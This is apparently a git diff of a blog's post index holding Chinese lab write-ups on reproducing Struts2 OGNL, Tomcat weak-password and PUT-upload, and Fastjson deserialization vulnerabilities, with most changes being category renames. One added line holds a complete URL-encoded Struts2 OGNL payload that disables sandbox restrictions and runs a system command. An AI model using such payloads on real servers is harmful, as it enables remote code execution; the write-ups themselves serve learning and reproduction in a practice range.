+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081415.png" alt="image"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
       </categories>
       <tags>
         <tag>Struts2</tag>
@@ -1023,7 +1049,7 @@
   </entry>
   <entry>
     <title>S2-devMode CVE-2016-4438复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-devMode%20CVE-2016-4438%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <url>/2020/08/14/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/S2-devMode%20CVE-2016-4438%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>当Struts2开启devMode模式时，将导致严重远程代码执行漏洞。如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等。</p>
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>当Struts开启devMode时，该漏洞将影响Struts 2.1.0–2.5.1，通杀Struts2所有版本。</p>
 <a id="more"></a>
@@ -1035,7 +1061,7 @@
 </ol>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>漏洞复现</category>
       </categories>
       <tags>
         <tag>Struts2</tag>
@@ -1043,7 +1069,7 @@
   </entry>
   <entry>
     <title>Tomcat-弱口令-getshell复现过程</title>
-    <url>/2020/08/12/Vulfocus%E9%9D%B6%E5%9C%BA/Tomcat-%E5%BC%B1%E5%8F%A3%E4%BB%A4-getshell%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <url>/2020/08/12/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat-%E5%BC%B1%E5%8F%A3%E4%BB%A4-getshell%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Apache+Tomcat 是很常用的网站解决方案，Apache 用于提供 web 服务，而 Tomcat 是 Apache 服务器的扩展，用于运行 jsp 页面和 servlet。Tomcat 有一个管理后台，其用户名和密码在 Tomcat 安装目录下的 conf\tomcat-users.xml 文件中配置，不少管理员为了方便，经常采用弱口令。 Tomcat 支持在后台部署 war 包，可以直接将 webshell 部署到 web 目录下，如果 tomcat 后台管理用户存在弱口令，这很容易被利用上传 webshell。</p>
 <h2 id="知识点：什么是war包"><a href="#知识点：什么是war包" class="headerlink" title="知识点：什么是war包"></a>知识点：什么是war包</h2><p>war 包是一种打包格式<br>Java web工程，都是打成war包，进行发布，打成war包的好处是不会缺少目录，并且只管理好一个发布文件就好，并且tomcat服务器能够自动识别，将war包放在tomcat容器的webapps下，启动服务，即可运行该项目，该war包会自动解压出一个同名的文件夹。<br>war 包的结构（是一个web 项目编译后的结果）</p>
 <a id="more"></a>
@@ -1066,7 +1092,7 @@
 </ol>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>漏洞复现</category>
       </categories>
       <tags>
         <tag>Tomcat</tag>
@@ -1074,7 +1100,7 @@
   </entry>
   <entry>
     <title>Tomcat 任意写入文件漏洞复现过程（CVE-2017-12615）</title>
-    <url>/2020/08/11/Vulfocus%E9%9D%B6%E5%9C%BA/Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88CVE-2017-12615%EF%BC%89/</url>
+    <url>/2020/08/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88CVE-2017-12615%EF%BC%89/</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Tomcat 7.0.0到7.0.79版本中存在远程代码执行漏洞，当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法时，攻击者可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件，文件中的代码被服务器执行。</p>
 <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Tomcat &gt;=7.0.0，&lt;=7.0.79</p>
 <a id="more"></a>
@@ -1093,7 +1119,7 @@
 </ol>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>漏洞复现</category>
       </categories>
       <tags>
         <tag>Tomcat</tag>
@@ -1101,7 +1127,7 @@
   </entry>
   <entry>
     <title>Fastjson_1.2.24反序列化漏洞复现过程</title>
-    <url>/2020/08/08/Vulfocus%E9%9D%B6%E5%9C%BA/Fastjson_1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <url>/2020/08/08/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Fastjson_1.2.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>FastJson 库是 Java 的一个 Json 库，其作用是将 Java 对象转换成 json 数据来表示，也可以将 json 数据转换成 Java 对象，使用非常方便，号称是执行速度最快的库。</p>
 <p>在 1.2.24 版本的 Fastjson 出现了一个反序列化的漏洞，fastjson 在解析 json 的过程中，支持使用 autoType 来实例化某一个具体的类，并调用该类的 set/get 方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p>
 <h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>fastjson &lt;= 1.2.47</p>
@@ -1153,7 +1179,7 @@
 </ol>
 ]]></content>
       <categories>
-        <category>vulfocus靶场练习</category>
+        <category>漏洞复现</category>
       </categories>
       <tags>
         <tag>Fastjson</tag>
